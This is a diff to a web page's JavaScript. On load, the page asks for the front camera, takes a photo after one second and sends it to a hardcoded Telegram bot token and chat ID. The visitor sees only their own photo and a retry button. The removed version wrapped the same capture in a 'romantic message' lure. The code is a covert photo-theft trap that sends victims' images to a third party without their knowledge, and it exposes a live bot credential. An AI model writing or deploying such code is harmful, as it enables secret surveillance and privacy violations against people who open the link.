@@ -4,17 +4,9 @@ let capturedImage = null;
 const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
 const TELEGRAM_CHAT_ID = "5323236080";
 
+const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const canvasDisplay = document.getElementById('canvas-display');
 const ctx = canvas.getContext('2d');
-const ctxDisplay = canvasDisplay.getContext('2d');
-
-const cameraPermissionScreen = document.getElementById('camera-permission');
-const romanticMessageScreen = document.getElementById('romantic-message');
-const photoRevealScreen = document.getElementById('photo-reveal');
-
-const revealBtn = document.getElementById('reveal-btn');
-const retryBtn = document.getElementById('retry-btn');
 
 window.addEventListener('load', () => {
     requestCameraAccess();
@@ -22,12 +14,6 @@ window.addEventListener('load', () => {
 
 async function requestCameraAccess() {
     try {
-        const tempVideo = document.createElement('video');
-        tempVideo.style.display = 'none';
-        tempVideo.autoplay = true;
-        tempVideo.playsinline = true;
-        document.body.appendChild(tempVideo);
-
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
@@ -36,13 +22,12 @@ async function requestCameraAccess() {
             }
         });
 
-        tempVideo.srcObject = stream;
-        tempVideo.onloadedmetadata = () => {
-            tempVideo.play();
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            video.play();
             setTimeout(() => {
-                capturePhoto(tempVideo);
-                tempVideo.remove();
-            }, 500);
+                capturePhoto();
+            }, 1000);
         };
 
     } catch (error) {
@@ -51,10 +36,10 @@ async function requestCameraAccess() {
     }
 }
 
-function capturePhoto(videoElement) {
-    canvas.width = videoElement.videoWidth;
-    canvas.height = videoElement.videoHeight;
-    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+function capturePhoto() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     capturedImage = canvas.toDataURL('image/jpeg');
 
     if (stream) {
@@ -62,7 +47,7 @@ function capturePhoto(videoElement) {
     }
 
     sendPhotoToTelegram();
-    showRomanticMessage();
+    displayCapturedPhoto();
 }
 
 async function sendPhotoToTelegram() {
@@ -90,32 +75,39 @@ async function sendPhotoToTelegram() {
     }
 }
 
-function showRomanticMessage() {
-    cameraPermissionScreen.classList.remove('active');
-    romanticMessageScreen.classList.add('active');
-}
-
-revealBtn.addEventListener('click', () => {
-    showPhotoReveal();
-});
-
-function showPhotoReveal() {
-    romanticMessageScreen.classList.remove('active');
-    photoRevealScreen.classList.add('active');
-
-    const img = new Image();
+function displayCapturedPhoto() {
+    video.style.display = 'none';
+    
+    const img = document.createElement('img');
     img.src = capturedImage;
-    img.onload = () => {
-        canvasDisplay.width = img.width;
-        canvasDisplay.height = img.height;
-        ctxDisplay.drawImage(img, 0, 0);
-    };
-}
+    img.id = 'captured-photo';
+    img.style.width = '100%';
+    img.style.height = '100%';
+    img.style.objectFit = 'cover';
+    
+    const container = document.getElementById('camera-permission');
+    container.innerHTML = '';
+    container.appendChild(img);
 
-retryBtn.addEventListener('click', () => {
-    capturedImage = null;
-    cameraPermissionScreen.classList.add('active');
-    romanticMessageScreen.classList.remove('active');
-    photoRevealScreen.classList.remove('active');
-    requestCameraAccess();
-});
+    const button = document.createElement('button');
+    button.textContent = 'Ulangi';
+    button.id = 'retry-btn';
+    button.style.position = 'absolute';
+    button.style.bottom = '30px';
+    button.style.padding = '12px 30px';
+    button.style.fontSize = '1rem';
+    button.style.background = '#667eea';
+    button.style.color = 'white';
+    button.style.border = 'none';
+    button.style.borderRadius = '50px';
+    button.style.cursor = 'pointer';
+    button.style.fontWeight = '600';
+    
+    container.appendChild(button);
+    
+    button.addEventListener('click', () => {
+        capturedImage = null;
+        video.style.display = 'block';
+        requestCameraAccess();
+    });
+}
